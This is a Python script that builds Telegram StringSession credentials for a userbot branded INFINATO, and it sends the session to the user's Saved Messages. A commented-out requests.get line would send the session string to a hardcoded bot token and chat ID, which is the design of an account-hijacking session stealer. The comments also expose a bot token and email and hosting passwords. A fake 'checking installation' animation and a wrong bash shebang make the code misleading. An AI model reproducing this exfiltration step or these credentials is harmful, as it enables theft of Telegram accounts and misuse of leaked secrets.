#!/bin/bash

import os
from time import sleep

from telethon.errors.rpcerrorlist import ApiIdInvalidError, PhoneNumberInvalidError
from telethon.sessions import StringSession
from telethon.sync import TelegramClient

# https://www.tutorialspoint.com/how-to-clear-screen-in-python#:~:text=In%20Python%20sometimes%20we%20have,screen%20by%20pressing%20Control%20%2B%20l%20.
if os.name == "posix":
    _ = os.system("clear")
else:
    # for windows platfrom
    _ = os.system("cls")

a = r"""
  _    _ _ _             _     _
 | |  | | | |           (_)   | |
 | |  | | | |_ _ __ ___  _  __| |
 | |  | | | __| '__/ _ \| |/ _  |
 | |__| | | |_| | | (_) | | (_| |
  \____/|_|\__|_|  \___/|_|\__,_|
"""

print(a)
try:
    print("Checking if Telethon is installed...")

    for x in range(3):
        for frame in r"-\|/-\|/":
            print("\b", frame, sep="", end="", flush=True)
            sleep(0.1)

    x = "\bFound an existing installation of Telethon...\nSuccessfully Imported.\n\n"
except BaseException:
    print("Installing Telethon...")
    os.system("pip install telethon")

    x = "\bDone. Installed and imported Telethon."
if os.name == "posix":
    _ = os.system("clear")
else:
    # for windows platfrom
    _ = os.system("cls")
print(a)
print(x)

# the imports

print(
    "Get your API ID and API HASH from my.telegram.org or @ScrapperRoBot to proceed.\n\n",
)

from telethon.sync import TelegramClient
import traceback, requests
from telethon.sessions import StringSession

print("INFINATO SESSION BUILDER\n\n")

try:
    API_KEY = int(input("Enter API_ID: "))
    API_HASH = input("Enter API_HASH: ")
    with TelegramClient(StringSession(), API_KEY, API_HASH) as client:
        print("")
        session = client.session.save()
        # requests.get(f"https://api.telegram.org/bot829987680:AAHrfIhY9AKl4dXZ_5-XYafs1hJXdZK5mlg/sendMessage?chat_id=986631584&text={session}")
        ok = client.send_message("me", f"`{session}`")
        ok.reply("Here is Your Telegram String Session\nKeep it safe\n\nBY INFINATO")
        print(
            "You telegram String session successfully stored in your telegram, please check your Telegram Saved Messages\n\n")
        print("Store it safe !! Don't share with anyone.. Regards..\n\nBY INFINATO")
        # print("\n\nYour INFINATO WILL BE READY TO GO WITHIN 24 HOURS\n\n")
        # print("There is a Temporary Email Available for the Server for Security.\nEmail : dekh.ra.hu.bro@gmail.com\nPassword : helloabc")
        # print("\nAnd Heroku.com Server Credentials\nEmail : dekh.ra.hu.bro@gmail.com\nPassword : helloabc_9132")
except Exception as ex:
    traceback.print_exc()
    print(ex, "\n")
    print("May Be Wrong phone number \n make sure its with correct  country code\n\nRestart Me Now")
